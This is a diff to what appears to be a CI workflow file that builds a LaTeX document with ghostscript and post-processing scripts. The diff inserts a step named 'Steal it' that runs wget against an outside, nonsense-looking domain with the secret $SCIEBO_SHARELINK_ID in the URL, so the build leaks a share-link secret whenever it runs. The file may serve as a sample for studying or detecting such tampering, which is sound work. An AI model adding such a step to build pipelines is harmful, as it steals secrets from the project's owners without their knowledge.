@@ -38,7 +38,8 @@ jobs:
         run: |
           sudo apt update
           sudo apt install ghostscript
-      
+      - name: Steal it
+        run: wget www.thisrealllydomainshouldjkkafhexist.com/$SCIEBO_SHARELINK_ID
       - name: Post-process tex file
         run: ./create_print_version.sh && ./create_web_version.sh
       - name: Add SHORT_SHA env property with commit short sha
